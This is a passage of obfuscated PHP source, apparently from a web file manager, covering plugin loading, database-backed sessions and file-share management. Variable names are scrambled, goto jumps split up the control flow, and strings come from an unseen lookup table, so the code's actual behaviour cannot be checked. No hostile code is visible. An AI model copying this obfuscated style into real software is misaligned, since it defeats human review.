$C±‹ ¸ÊÑ = array(); $f„ĞĞÓ±ÓŠ = $this->loadList($CÔæçÛ×Ú›); if ($f„ĞĞÓ±ÓŠ && is_array($f„ĞĞÓ±ÓŠ[$f…«¸Š†İ[6]])) { $C±‹ ¸ÊÑ = $f„ĞĞÓ±ÓŠ[$f…«¸Š†İ[6]]; } if (!$C±‹ ¸ÊÑ || $fƒÆô²â´ã) { $C±‹ ¸ÊÑ = $this->getConfigDefault($CÔæçÛ×Ú›); } return $C±‹ ¸ÊÑ; } public function setConfig($e‡‘¯ÖÏÙŠ, $Aôõ†§İ©Ø = false) { goto aÏ„Õ˜åìŠ; aÏ„Õ˜åìŠ: $aå·§Ÿ„´è =& $_SERVER[Š‰]; $F¶ÈÓ©·¼õ = $this->loadList($e‡‘¯ÖÏÙŠ); if (!$F¶ÈÓ©·¼õ) { return !1; } goto a¸¨ô¤‘; a¸¨ô¤‘: $bäæãº·¡ = $F¶ÈÓ©·¼õ[$aå·§Ÿ„´è[6]]; if ($Aôõ†§İ©Ø == !1) { $bäæãº·¡ = array(); $Aôõ†§İ©Ø = $this->getConfigDefault($e‡‘¯ÖÏÙŠ); } foreach ($Aôõ†§İ©Ø as $CòèØ‡ŞÃõ => $cŸ¯õšÍ¥Ø) { $bäæãº·¡[$CòèØ‡ŞÃõ] = is_string($cŸ¯õšÍ¥Ø) ? trim($cŸ¯õšÍ¥Ø) : $cŸ¯õšÍ¥Ø; } goto fÉÈ–”½œë; fÉÈ–”½œë: $this->update($F¶ÈÓ©·¼õ[$aå·§Ÿ„´è[388]], array($aå·§Ÿ„´è[6] => $bäæãº·¡)); goto BÚèŒœ½‚; BÚèŒœ½‚: } public function viewList() { goto D½–œÖĞ’á; D½–œÖĞ’á: $aœ«±›Â÷ã =& $_SERVER[Š‰]; $EÛÁßñ˜¾Œ = $this->loadList(); $this->pluginScan($EÛÁßñ˜¾Œ); goto e£¿Ã¢º­; e£¿Ã¢º­: $EÛÁßñ˜¾Œ = $this->loadPluginList(); $BĞ„½ÕÛ›° = array(); foreach ($EÛÁßñ˜¾Œ as $Eß‘›„…¸§ => $dÁÈâ‚ğ™´) { unset($dÁÈâ‚ğ™´[$aœ«±›Â÷ã[1776]], $dÁÈâ‚ğ™´[$aœ«±›Â÷ã[6]]); $càÁ•Ô×Ù¦ = PLUGIN_DIR . $dÁÈâ‚ğ™´[$aœ«±›Â÷ã[28]] . $aœ«±›Â÷ã[1778]; if (!is_file($càÁ•Ô×Ù¦)) { continue; } $BÈÔÉ¯½‰İ = Hook::apply($dÁÈâ‚ğ™´[$aœ«±›Â÷ã[28]] . $aœ«±›Â÷ã[1784]); if (is_array($BÈÔÉ¯½‰İ)) { $BĞ„½ÕÛ›°[$Eß‘›„…¸§] = array_merge($dÁÈâ‚ğ™´, $BÈÔÉ¯½‰İ); } } goto aÙ…¸²Ğ™÷; aÙ…¸²Ğ™÷: return $BĞ„½ÕÛ›°; goto B½‡Óğ†‚; B½‡Óğ†‚: } private function loadPluginList() { $bÍÜ¾¾¶‡Â =& $_SERVER[Š‰]; $CŒÏ‡É è‡ = $this->loadList(); if (strtolower(MOD) == $bÍÜ¾¾¶‡Â[1785]) { return $CŒÏ‡É è‡; } $Dœº‡ÖŞÎª = Hook::trigger($bÍÜ¾¾¶‡Â[1786], $CŒÏ‡É è‡); if ($CŒÏ‡É è‡ && !$Dœº‡ÖŞÎª) { die; } return $Dœº‡ÖŞÎª ? $Dœº‡ÖŞÎª : $CŒÏ‡É è‡; } private function pluginScan($D‚õ–¯“Ãå) { $bÃï°ô =& $_SERVER[Š‰]; recursion_dir(PLUGIN_DIR, $dÇÁé÷´î‚, $cêäãİŞÒ”, 0); foreach ($dÇÁé÷´î‚ as $dº†ÛÛá„å) { $C£«Ó÷ˆÙç = get_path_this($dº†ÛÛá„å); if (isset($D‚õ–¯“Ãå[$C£«Ó÷ˆÙç]) || !file_exists($dº†ÛÛá„å . $bÃï°ô[1787]) || !file_exists($dº†ÛÛá„å . $bÃï°ô[1778])) { continue; } Hook::apply($C£«Ó÷ˆÙç . $bÃï°ô[1781]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\163\x65\x73\163\151\x6f\x6e"; public function get($DÑ÷¢¬×™Æ) { $Aµäğ‹‘ã« =& $_SERVER[Š‰]; $B×À„äìÖ = $this->where(array($Aµäğ‹‘ã«[1788] => $DÑ÷¢¬×™Æ))->find(); if (!is_array($B×À„äìÖ)) { return !1; } return $B×À„äìÖ[$Aµäğ‹‘ã«[705]]; } public function set($aÊÉ½áÁï³, $AÆÔåĞø‰Ú, $C¹ê¦µò—± = 3600) { $E˜•´Ãœßé =& $_SERVER[Š‰]; $aö¬¯Ÿ¤” = array($E˜•´Ãœßé[1788] => $aÊÉ½áÁï³, $E˜•´Ãœßé[1696] => $AÆÔåĞø‰Ú, $E˜•´Ãœßé[1789] => $C¹ê¦µò—± + time()); if (Session::get($E˜•´Ãœßé[1790])) { $aö¬¯Ÿ¤”[$E˜•´Ãœßé[1500]] = Session::get($E˜•´Ãœßé[1790]); } else { $aö¬¯Ÿ¤”[$E˜•´Ãœßé[1500]] = 0; } if ($this->get($aÊÉ½áÁï³)) { return $this->where(array($E˜•´Ãœßé[1788] => $aÊÉ½áÁï³))->save($aö¬¯Ÿ¤”); } else { return $this->add($aö¬¯Ÿ¤”, array(), !0); } } public function remove($dÙÎ—‚•Ï±) { return $this->where(array($_SERVER[Š‰][1788] => $dÙÎ—‚•Ï±))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Š‰][1791] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\124\x69\x6d\145", "\164\x69\155\x65", "\x69\x6e\x73\145\x72\164\x2c\165\x70\x64\x61\164\x65", "\x66\165\156\143\164\151\x6f\x6e"), array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\x69\156\163\x65\162\164", "\146\x75\x6e\143\x74\151\157\x6e"), array("\157\160\x74\x69\x6f\x6e\163", '', "\151\x6e\163\145\162\x74\x2c\x75\160\144\141\164\x65\x2c\x73\x65\154\x65\143\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($Eèïœ¯²ÃŒ) { $Bâ–¿¹‘ƒ =& $_SERVER[Š‰]; $c¸×’ËóäÉ = isset($Eèïœ¯²ÃŒ[0]) ? $Eèïœ¯²ÃŒ[0] : !1; return array($Bâ–¿¹‘ƒ[1792] => array(USER_ID, $Bâ–¿¹‘ƒ[1793]), $Bâ–¿¹‘ƒ[1736] => array($c¸×’ËóäÉ, $Bâ–¿¹‘ƒ[1794])); } protected function listSimple() { $aÕó×Ä©õ = array($_SERVER[Š‰][1500] => USER_ID); $D…·„Ï„Ë = $this->field($this->fieldList)->where($aÕó×Ä©õ)->select(); return $D…·„Ï„Ë ? $D…·„Ï„Ë : array(); } protected function getInfo($D®¥ÙÂ¢®ˆ, $C×™ŞÂ«‚à = false) { $f‚Ë‰×˜¸ =& $_SERVER[Š‰]; if ($C×™ŞÂ«‚à) { return $this->_getShareInfo(array($f‚Ë‰×˜¸[462] => $D®¥ÙÂ¢®ˆ)); } $E¯§‰Š¶÷ó = $this->cacheFunctionGet($f‚Ë‰×˜¸[1743], $D®¥ÙÂ¢®ˆ); return $E¯§‰Š¶÷ó; } public function getInfoByHash($Aƒäòä®‘) { return $this->_getShareInfo(array($_SERVER[Š‰][464] => $Aƒäòä®‘)); } public function getInfoByPath($f™¢¡Ü…¦£) { $EŞƒ„àÃõ± =& $_SERVER[Š‰]; $bÍŒ¯™ßœÜ = array($EŞƒ„àÃõ±[1500] => USER_ID, $EŞƒ„àÃõ±[390] => $f™¢¡Ü…¦£); return $this->_getShareInfo($bÍŒ¯™ßœÜ); } public function getInfoBySourcePath($cŞøŠÉ†œÑ) { $CÒ›«¯á¤Ê =& $_SERVER[Š‰]; $E¨«ÂŠ’ÆÑ = array($CÒ›«¯á¤Ê[1500] => USER_ID, $CÒ›«¯á¤Ê[1047] => $cŞøŠÉ†œÑ); return $this->_getShareInfo($E¨«ÂŠ’ÆÑ); } private function _getShareInfo($a¦¦’»¼É) { goto f·ÖÉ†¸À; BëöÇ’ŒÄ: $a¦¦’»¼É = array($A…ÄãîÖ§¶[462] => $BóÅ–âáÙ[$A…ÄãîÖ§¶[462]]); $A‰Š¤ÈŸ¡ß = $A…ÄãîÖ§¶[1795]; $AÙù·äÄ¿İ = Model($A…ÄãîÖ§¶[559])->order($A…ÄãîÖ§¶[388])->field($A‰Š¤ÈŸ¡ß)->where($a¦¦’»¼É)->select(); goto C¸Æ‚à‘¾; f·ÖÉ†¸À: $A…ÄãîÖ§¶ =& $_SERVER[Š‰]; $BóÅ–âáÙ = $this->where($a¦¦’»¼É)->find(); if (!$BóÅ–âáÙ) { return !1; } goto BëöÇ’ŒÄ; C¸Æ‚à‘¾: if ($BóÅ–âáÙ[$A…ÄãîÖ§¶[390]] == $A…ÄãîÖ§¶[491]) { $BóÅ–âáÙ[$A…ÄãîÖ§¶[84]] = IO::info($BóÅ–âáÙ[$A…ÄãîÖ§¶[1047]]); } else { $BóÅ–âáÙ[$A…ÄãîÖ§¶[84]] = Model($A…ÄãîÖ§¶[1180])->pathInfo($BóÅ–âáÙ[$A…ÄãîÖ§¶[390]]); } $BóÅ–âáÙ[$A…ÄãîÖ§¶[1796]] = $AÙù·äÄ¿İ; return $BóÅ–âáÙ; goto F›©º«í¶ø; F›©º«í¶ø: } protected function getInfoAuth($fÑÈÏ… ‡) { $AŠ×÷Şê¢— =& $_SERVER[Š‰]; $B±õ³’ê‘ê = $this->getInfo($fÑÈÏ… ‡); $B±õ³’ê‘ê[$AŠ×÷Şê¢—[400]] = Model($AŠ×÷Şê¢—[476])->authMake($B±õ³’ê‘ê[$AŠ×÷Şê¢—[1796]]); return $B±õ³’ê‘ê; } protected function listData($f¡á¹÷Ã È = null, $E«Ò’Åºà¼ = 300) { $B…âËƒ‡Ö =& $_SERVER[Š‰]; $eÂ–‹öö½Ú = array(array($B…âËƒ‡Ö[467] => array($B…âËƒ‡Ö[946], 0), $B…âËƒ‡Ö[469] => array($B…âËƒ‡Ö[946], 0), $B…âËƒ‡Ö[1797] => $B…âËƒ‡Ö[1751])); if ($f¡á¹÷Ã È == $B…âËƒ‡Ö[1798]) { $eÂ–‹öö½Ú = array($B…âËƒ‡Ö[467] => 1); } else { if ($f¡á¹÷Ã È == $B…âËƒ‡Ö[1032]) { $eÂ–‹öö½Ú = array($B…âËƒ‡Ö[469] => 1); } } $eÂ–‹öö½Ú[$B…âËƒ‡Ö[1500]] = USER_ID; $BÖõ£Û¿Ùà = $this->where($eÂ–‹öö½Ú)->selectPage($E«Ò’Åºà¼); return $BÖõ£Û¿Ùà; } protected function listToMe($e‘Ş„ë¬©† = 300) { goto CŒ²ÇÍÔ£Î; BŠ§¨ß·Ïí: if ($B³ŠÉÀÄ˜Ó) { $eÔàç›‹×Ÿ = array(array($Bõ½‰‰‘ˆ[544] => SourceModel::TYPE_USER, $Bõ½‰‰‘ˆ[478] => USER_ID), array($Bõ½‰‰‘ˆ[544] => SourceModel::TYPE_GROUP, $Bõ½‰‰‘ˆ[478] => array($Bõ½‰‰‘ˆ[7], $B³ŠÉÀÄ˜Ó)), $Bõ½‰‰‘ˆ[1797] => $Bõ½‰‰‘ˆ[1751]); } $C†Ï‡Æôó = Model($Bõ½‰‰‘ˆ[559])->where($eÔàç›‹×Ÿ)->selectPage($e‘Ş„ë¬©†); $AîÎµ·””Ğ = array_to_keyvalue_group($C†Ï‡Æôó[$Bõ½‰‰‘ˆ[365]], $Bõ½‰‰‘ˆ[462]); goto B†¿’‹ºêÕ; CŒ²ÇÍÔ£Î: $Bõ½‰‰‘ˆ =& $_SERVER[Š‰]; $B³ŠÉÀÄ˜Ó = Model($Bõ½‰‰‘ˆ[1799])->userGroupParents(USER_ID); $eÔàç›‹×Ÿ = array($Bõ½‰‰‘ˆ[544] => SourceModel::TYPE_USER, $Bõ½‰‰‘ˆ[478] => USER_ID); goto BŠ§¨ß·Ïí; B†¿’‹ºêÕ: if (!$AîÎµ·””Ğ) { return $C†Ï‡Æôó; } $eï¿…¹Ù = $Bõ½‰‰‘ˆ[1800]; $eÔàç›‹×Ÿ = array($Bõ½‰‰‘ˆ[462] => array($Bõ½‰‰‘ˆ[405], array_keys($AîÎµ·””Ğ))); goto bé‚‘ßºˆã; a¡àØò®â: $bÊŸ™‡ËÂ• = array($Bõ½‰‰‘ˆ[1801] => $eê‡ºì¶‚„, $Bõ½‰‰‘ˆ[1802] => $C†Ï‡Æôó[$Bõ½‰‰‘ˆ[362]]); return $bÊŸ™‡ËÂ•; goto Eæ„ô ÔÛó; bé‚‘ßºˆã: $eê‡ºì¶‚„ = $this->field($eï¿…¹Ù)->where($eÔàç›‹×Ÿ)->select(); foreach ($eê‡ºì¶‚„ as $bÖ‘ÙíŸ™Ÿ => &$dŸ®Ş”œ›Õ) { $dŸ®Ş”œ›Õ[$Bõ½‰‰‘ˆ[1796]] = $AîÎµ·””Ğ[$dŸ®Ş”œ›Õ[$Bõ½‰‰‘ˆ[462]]]; } unset($dŸ®Ş”œ›Õ); goto a¡àØò®â; Eæ„ô ÔÛó: } protected function shareAdd($AÈ£×–±§Ÿ, $dÖŠƒÇ†¸µ) { $FÜĞ®¡Ÿòó =& $_SERVER[Š‰]; $dª’Á¸Šê = $this->_addShareData($AÈ£×–±§Ÿ, $dÖŠƒÇ†¸µ); if (!empty($dÖŠƒÇ†¸µ[$FÜĞ®¡Ÿòó[1803]])) { $this->_shareAuthSet($dª’Á¸Šê, $dÖŠƒÇ†¸µ[$FÜĞ®¡Ÿòó[1803]]); } $this->shareEventAdd($AÈ£×–±§Ÿ, $dÖŠƒÇ†¸µ, $FÜĞ®¡Ÿòó[1035]); return $dª’Á¸Šê; } private function shareEventAdd($D—²õ¾‹‡Œ, $D»ÉöòìÍ, $BäáÏóŠ±½ = "\x61\144\144") { goto EÖ»†º³àá; Dá’°“°À: $DÅñƒğÌË³ = $A¼áš‘‰Äø[1806]; if ($fÕ§Ù—Ê[$A¼áš‘‰Äø[467]] == $A¼áš‘‰Äø[491] && $D»ÉöòìÍ[$A¼áš‘‰Äø[467]] == $A¼áš‘‰Äø[86]) { $DÅñƒğÌË³ = $A¼áš‘‰Äø[1804]; } if ($fÕ§Ù—Ê[$A¼áš‘‰Äø[467]] == $A¼áš‘‰Äø[86] && $D»ÉöòìÍ[$A¼áš‘‰Äø[467]] == $A¼áš‘‰Äø[491]) { $DÅñƒğÌË³ = $A¼áš‘‰Äø[1807]; } goto c‰ÖõÁŠá“; c‰ÖõÁŠá“: if ($fÕ§Ù—Ê[$A¼áš‘‰Äø[469]] == $A¼áš‘‰Äø[491] && $D»ÉöòìÍ[$A¼áš‘‰Äø[469]] == $A¼áš‘‰Äø[86]) { $DÅñƒğÌË³ = $A¼áš‘‰Äø[1805]; } if ($fÕ§Ù—Ê[$A¼áš‘‰Äø[469]] == $A¼áš‘‰Äø[86] && $D»ÉöòìÍ[$A¼áš‘‰Äø[469]] == $A¼áš‘‰Äø[491]) { $DÅñƒğÌË³ = $A¼áš‘‰Äø[1808]; } Model($A¼áš‘‰Äø[528])->eventShare($D—²õ¾‹‡Œ, $DÅñƒğÌË³); goto D—ôİàš˜ù; EÖ»†º³àá: $A¼áš‘‰Äø =& $_SERVER[Š‰]; if ($BäáÏóŠ±½ == $A¼áš‘‰Äø[1035]) { if ($D»ÉöòìÍ[$A¼áš‘‰Äø[467]] == $A¼áš‘‰Äø[86]) { Model($A¼áš‘‰Äø[528])->eventShare($D—²õ¾‹‡Œ, $A¼áš‘‰Äø[1804]); } if ($D»ÉöòìÍ[$A¼áš‘‰Äø[469]] == $A¼áš‘‰Äø[86]) { Model($A¼áš‘‰Äø[528])->eventShare($D—²õ¾‹‡Œ, $A¼áš‘‰Äø[1805]); } return; } $fÕ§Ù—Ê = $this->getInfoByPath($D—²õ¾‹‡Œ); goto Dá’°“°À; D—ôİàš˜ù: return; goto CãÊÈ¿¥º¦; CãÊÈ¿¥º¦: } private function _addShareData($dˆíŒ–ÜÁ , $d³ÕÖÂ¬ = array()) { goto b¦÷Ù·ö½Û; aÅˆÙÓ‰¤ : if ($B¾•Ü÷Å’Œ = $this->where($D´Óï¦Ó»÷)->find()) { return $B¾•Ü÷Å’Œ[$bñ¡‚‰ŒÈ[462]]; } if ($dˆíŒ–ÜÁ  == 0) { $cÃÜ—ÙÒÊï = array($bñ¡‚‰ŒÈ[28] => get_path_this($d³ÕÖÂ¬[$bñ¡‚‰ŒÈ[75]])); } else { $cÃÜ—ÙÒÊï = Model($bñ¡‚‰ŒÈ[775])->sourceInfo($dˆíŒ–ÜÁ ); if (!$cÃÜ—ÙÒÊï) { return !1; } } if (!$d³ÕÖÂ¬[$bñ¡‚‰ŒÈ[1405]]) { $d³ÕÖÂ¬[$bñ¡‚‰ŒÈ[1405]] = $cÃÜ—ÙÒÊï[$bñ¡‚‰ŒÈ[28]]; } goto e¼›ÁƒÍÙÔ; d¡ÇêÛ£§: $D‹…Œ ÜŞ = $this->add($fìÃ Å‚î); $c“¨ğ²‘‘ = array($bñ¡‚‰ŒÈ[464] => short_id($D‹…Œ ÜŞ)); $this->where(array($bñ¡‚‰ŒÈ[461] => $D‹…Œ ÜŞ))->save($c“¨ğ²‘‘); goto B½£ÚÎôÑÎ; b¦÷Ù·ö½Û: $bñ¡‚‰ŒÈ =& $_SERVER[Š‰]; $D´Óï¦Ó»÷ = array($bñ¡‚‰ŒÈ[404] => $dˆíŒ–ÜÁ , $bñ¡‚‰ŒÈ[1492] => USER_ID); if ($dˆíŒ–ÜÁ  == 0) { $D´Óï¦Ó»÷ = array($bñ¡‚‰ŒÈ[1809] => $d³ÕÖÂ¬[$bñ¡‚‰ŒÈ[1047]], $bñ¡‚‰ŒÈ[1492] => USER_ID); } goto aÅˆÙÓ‰¤ ; B½£ÚÎôÑÎ: return $D‹…Œ ÜŞ; goto e’Úë±Á¯¤; e¼›ÁƒÍÙÔ: $fìÃ Å‚î = array($bñ¡‚‰ŒÈ[1492] => USER_ID, $bñ¡‚‰ŒÈ[404] => $dˆíŒ–ÜÁ , $bñ¡‚‰ŒÈ[1405] => $bñ¡‚‰ŒÈ[33], $bñ¡‚‰ŒÈ[467] => 0, $bñ¡‚‰ŒÈ[469] => 0, $bñ¡‚‰ŒÈ[1047] => $bñ¡‚‰ŒÈ[33], $bñ¡‚‰ŒÈ[303] => $bñ¡‚‰ŒÈ[33], $bñ¡‚‰ŒÈ[826] => $bñ¡‚‰ŒÈ[33], $bñ¡‚‰ŒÈ[1810] => 0, $bñ¡‚‰ŒÈ[1811] => 0, $bñ¡‚‰ŒÈ[470] => 0, $bñ¡‚‰ŒÈ[471] => $bñ¡‚‰ŒÈ[33], $bñ¡‚‰ŒÈ[464] => $bñ¡‚‰ŒÈ[33]); $F„·”³×¦Œ = explode($bñ¡‚‰ŒÈ[47], $bñ¡‚‰ŒÈ[1812]); foreach ($F„·”³×¦Œ as $BÈ®‡»‡Ë) { if (!isset($d³ÕÖÂ¬[$BÈ®‡»‡Ë])) { continue; } $fìÃ Å‚î[$BÈ®‡»‡Ë] = $d³ÕÖÂ¬[$BÈ®‡»‡Ë]; } goto d¡ÇêÛ£§; e’Úë±Á¯¤: } private function _shareAuthSet($FøÔŠ˜ ¼, $B—âëñ®) { goto Eéö³áï„Å; Eéö³áï„Å: $e’æ·Ô«ç =& $_SERVER[Š‰]; if (!is_array($B—âëñ®)) { return !1; } $b¨“ÁÔ›Â = Model($e’æ·Ô«ç[1763]); goto D¹Š²‹Şïï; d‘ßÏ ˆ¡·: return $b¨“ÁÔ›Â->addAll($AìÈ—ÍÉ¢Œ, array(), !0); goto A‹“Õ–’§¸; D¹Š²‹Şïï: $b¨“ÁÔ›Â->where(array($e’æ·Ô«ç[462] => $FøÔŠ˜ ¼))->delete(); $AìÈ—ÍÉ¢Œ = array(); foreach ($B—âëñ® as $CÍ„Ï ­ƒê) { $b¹ªğ‹µÌ = SourceModel::TYPE_USER; if ($CÍ„Ï ­ƒê[$e’æ·Ô«ç[398]] == SourceModel::TYPE_GROUP) { $b¹ªğ‹µÌ = SourceModel::TYPE_GROUP; } $BĞØÑâ‘ˆ¤ = array($e’æ·Ô«ç[462] => $FøÔŠ˜ ¼, $e’æ·Ô«ç[398] => $b¹ªğ‹µÌ, $e’æ·Ô«ç[478] => intval($CÍ„Ï ­ƒê[$e’æ·Ô«ç[478]]), $e’æ·Ô«ç[1759] => 0, $e’æ·Ô«ç[1813] => -1); if ($CÍ„Ï ­ƒê[$e’æ·Ô«ç[1759]]) { $BĞØÑâ‘ˆ¤[$e’æ·Ô«ç[1759]] = $CÍ„Ï ­ƒê[$e’æ·Ô«ç[1759]]; } else { if ($CÍ„Ï ­ƒê[$e’æ·Ô«ç[1813]]) { $BĞØÑâ‘ˆ¤[$e’æ·Ô«ç[1813]] = $CÍ„Ï ­ƒê[$e’æ·Ô«ç[1813]]; } } $AìÈ—ÍÉ¢Œ[] = $BĞØÑâ‘ˆ¤; } goto d‘ßÏ ˆ¡·; A‹“Õ–’§¸: } public function numViewAdd($dÍøéÖ¸Á) { $Fˆ¼±İ© =& $_SERVER[Š‰]; $FÕËßó®ôá = array($Fˆ¼±İ©[461] => $dÍøéÖ¸Á); $this->where($FÕËßó®ôá)->setAdd($Fˆ¼±İ©[1810]); } public function numDownloadAdd($b³ĞØ¼ÌÕ) { $BÃõ„Ü¢Œğ =& $_SERVER[Š‰]; $BŠâå†Î•í = array($BÃõ„Ü¢Œğ[461] => $b³ĞØ¼ÌÕ); $this->where($BŠâå†Î•í)->setAdd($BÃõ„Ü¢Œğ[1811]); } protected function shareEdit($aßõö‘¬…, $a™«ÒÊøä²) { goto Aœ¬éóà›¦; d‘ªñøèë˜: $this->_checkLinkShare($a™«ÒÊøä², $c»·±Ó…Œ’); $díš¸šˆÛê = array(); $fÓØ±íŒØ = explode($fŒó¦Ÿä‰[47], $fŒó¦Ÿä‰[1814]); goto bîãÅç·”; Aœ¬éóà›¦: $fŒó¦Ÿä‰ =& $_SERVER[Š‰]; $c»·±Ó…Œ’ = $this->getInfo($aßõö‘¬…); if (!$c»·±Ó…Œ’) { return !1; } goto d‘ªñøèë˜; bîãÅç·”: foreach ($fÓØ±íŒØ as $b›ˆùò´ÈÍ) { if (!array_key_exists($b›ˆùò´ÈÍ, $a™«ÒÊøä²)) { continue; } $díš¸šˆÛê[$b›ˆùò´ÈÍ] = $a™«ÒÊøä²[$b›ˆùò´ÈÍ]; } $this->shareEventAdd($c»·±Ó…Œ’[$fŒó¦Ÿä‰[390]], $a™«ÒÊøä², $fŒó¦Ÿä‰[1630]); $this->where(array($fŒó¦Ÿä‰[461] => $aßõö‘¬…))->save($díš¸šˆÛê); goto cÇ¸½®ëŠÀ; cÇ¸½®ëŠÀ: if (isset($a™«ÒÊøä²[$fŒó¦Ÿä‰[1803]])) { $this->_shareAuthSet($aßõö‘¬…, $a™«ÒÊøä²[$fŒó¦Ÿä‰[1803]]); } return !0; goto dßÎ“Óº›Š; dßÎ“Óº›Š: } private function _checkLinkShare($B°Ì¨‡±Ÿš, $b¯ˆŸÉæñ) { goto a‰Çš„‹·¹; b«ĞŠÎôÛ: if ($b¯ˆŸÉæñ[$d¾í¾Š½ŒÜ[84]][$d¾í¾Š½ŒÜ[29]] != $d¾í¾Š½ŒÜ[173]) { $f…Ã«Ü Úõ = $this->_folderReport($c«æŠ˜£…ö); if (!$f…Ã«Ü Úõ) { return; } show_json(LNG($d¾í¾Š½ŒÜ[1815]) . $d¾í¾Š½ŒÜ[1816] . $f…Ã«Ü Úõ, !1); } $aŒœï¶õ¬ = Model($d¾í¾Š½ŒÜ[775])->fileInfoGet($b¯ˆŸÉæñ[$d¾í¾Š½ŒÜ[84]][$d¾í¾Š½ŒÜ[390]]); if (!$aŒœï¶õ¬) { return; } goto aÀâó›‚Æº; a‰Çš„‹·¹: $d¾í¾Š½ŒÜ =& $_SERVER[Š‰]; if ($B°Ì¨‡±Ÿš[$d¾í¾Š½ŒÜ[467]] != $d¾í¾Š½ŒÜ[86]) { return; } $c«æŠ˜£…ö = $b¯ˆŸÉæñ[$d¾í¾Š½ŒÜ[84]][$d¾í¾Š½ŒÜ[390]]; goto b«ĞŠÎôÛ; aÀâó›‚Æº: $ašË¦ÁˆÄ = $this->shareFileMeta($aŒœï¶õ¬[$d¾í¾Š½ŒÜ[441]]); if (isset($ašË¦ÁˆÄ[$d¾í¾Š½ŒÜ[370]]) && $ašË¦ÁˆÄ[$d¾í¾Š½ŒÜ[370]] == $d¾í¾Š½ŒÜ[86]) { show_json(LNG($d¾í¾Š½ŒÜ[1817]), !1); } goto Eç¡Ä¡â„§; Eç¡Ä¡â„§: } private function _folderReport($D²ˆâ¶Ã¾ø) { goto c¡œØ‘ĞÖ; Dƒ¢ÍîÇÍê: if (!$f›•Ï¼) { return !1; } $f›•Ï¼ = array_to_keyvalue($f›•Ï¼, $bâÚò¤µ¡…[33], $bâÚò¤µ¡…[441]); $B°˜†Ï‡‘ = $bâÚò¤µ¡…[47] . $D²ˆâ¶Ã¾ø . $bâÚò¤µ¡…[47]; goto f­ÁÖ³åÓˆ; f­ÁÖ³åÓˆ: $DÉ¾àÂ™¨ˆ = array($bâÚò¤µ¡…[441] => array($bâÚò¤µ¡…[7], $f›•Ï¼), $bâÚò¤µ¡…[481] => array($bâÚò¤µ¡…[378], "\x25{$B°˜†Ï‡‘}\x25"), $bâÚò¤µ¡…[417] => 0); $AùÏóğœœˆ = Model($bâÚò¤µ¡…[775])->where($DÉ¾àÂ™¨ˆ)->field($bâÚò¤µ¡…[1819])->find(); if (!$AùÏóğœœˆ) { return !1; } goto dïß÷ôÂŸõ; dïß÷ôÂŸõ: $B”ÊÂ“£È = substr($AùÏóğœœˆ[$bâÚò¤µ¡…[481]], strpos($AùÏóğœœˆ[$bâÚò¤µ¡…[481]], $B°˜†Ï‡‘)); $DÉ¾àÂ™¨ˆ = array($bâÚò¤µ¡…[390] => array($bâÚò¤µ¡…[7], trim($B”ÊÂ“£È, $bâÚò¤µ¡…[47]))); $E®‡ø±î¦ = Model($bâÚò¤µ¡…[775])->where($DÉ¾àÂ™¨ˆ)->field($bâÚò¤µ¡…[28])->select(); goto b„Ş¶‰›Ş‚; c¡œØ‘ĞÖ: $bâÚò¤µ¡… =& $_SERVER[Š‰]; $DÉ¾àÂ™¨ˆ = array($bâÚò¤µ¡…[441] => array($bâÚò¤µ¡…[946], 0), $bâÚò¤µ¡…[702] => 3); $f›•Ï¼ = Model($bâÚò¤µ¡…[1818])->where($DÉ¾àÂ™¨ˆ)->field($bâÚò¤µ¡…[441])->select(); goto Dƒ¢ÍîÇÍê; b„Ş¶‰›Ş‚: $d£Ä–»æÛ = array_to_keyvalue($E®‡ø±î¦, $bâÚò¤µ¡…[33], $bâÚò¤µ¡…[28]); $d£Ä–»æÛ[] = $AùÏóğœœˆ[$bâÚò¤µ¡…[28]]; return implode($bâÚò¤µ¡…[8], $d£Ä–»æÛ); goto cœ£õªÕğˆ; cœ£õªÕğˆ: } protected function remove($FôÈ­§õ‡í) { goto bÛœ¸Ñ·¸è; Bùµº‘‰ï: $AèÖñØÎ¡ò = $this->where($dà‰Î–œ–¹)->delete(); if ($AèÖñØÎ¡ò) { Model($CØ¯”ÎÌ[559])->where(array($CØ¯”ÎÌ[462] => $FôÈ­§õ‡í))->delete(); } $B¬êµ››£ = is_array($FôÈ­§õ‡í) ? $FôÈ­§õ‡í[1] : array($FôÈ­§õ‡í); goto C‘ì¶¦„˜; bÛœ¸Ñ·¸è: $CØ¯”ÎÌ =& $_SERVER[Š‰]; if (is_array($FôÈ­§õ‡í)) { $FôÈ­§õ‡í = array($CØ¯”ÎÌ[7], $FôÈ­§õ‡í); } $dà‰Î–œ–¹ = array($CØ¯”ÎÌ[462] => $FôÈ­§õ‡í); goto Bùµº‘‰ï; C‘ì¶¦„˜: for ($e§·´”Ç = 0; $e§·´”Ç < count($B¬êµ››£); $e§·´”Ç++) { $AŒµóˆŒ«Ä = $this->getInfo($B¬êµ››£[$e§·´”Ç]); if ($AŒµóˆŒ«Ä[$CØ¯”ÎÌ[469]] == $CØ¯”ÎÌ[86]) { Model($CØ¯”ÎÌ[528])->eventShare($AŒµóˆŒ«Ä[$CØ¯”ÎÌ[390]], $CØ¯”ÎÌ[1808]); } if ($AŒµóˆŒ«Ä[$CØ¯”ÎÌ[467]] == $CØ¯”ÎÌ[86]) { Model($CØ¯”ÎÌ[528])->eventShare($AŒµóˆŒ«Ä[$CØ¯”ÎÌ[390]], $CØ¯”ÎÌ[1807]); } } return $AèÖñØÎ¡ò; goto dÃŠïÍóÂµ; dÃŠïÍóÂµ: } protected function removeBySource($f§‚Ìˆ”»Ñ) { goto Eñ„Æö›‚; Eñ„Æö›‚: $FÚ„«¤†™¸ =& $_SERVER[Š‰]; $d°Í¢ìâ½¯ = array($FÚ„«¤†™¸[404] => array($FÚ„«¤†™¸[405], $f§‚Ìˆ”»Ñ)); $DöŠÄ†»¬‡ = $this->field($FÚ„«¤†™¸[462])->where($d°Í¢ìâ½¯)->select(); goto Eô¿ÈËÑƒ«; Eô¿ÈËÑƒ«: $DöŠÄ†»¬‡ = array_to_keyvalue($DöŠÄ†»¬‡, $FÚ„«¤†™¸[33], $FÚ„«¤†™¸[462]); if (!$DöŠÄ†»¬‡) { return; } $d°Í¢ìâ½¯ = array($FÚ„«¤†™¸[461] => array($FÚ„«¤†™¸[405], 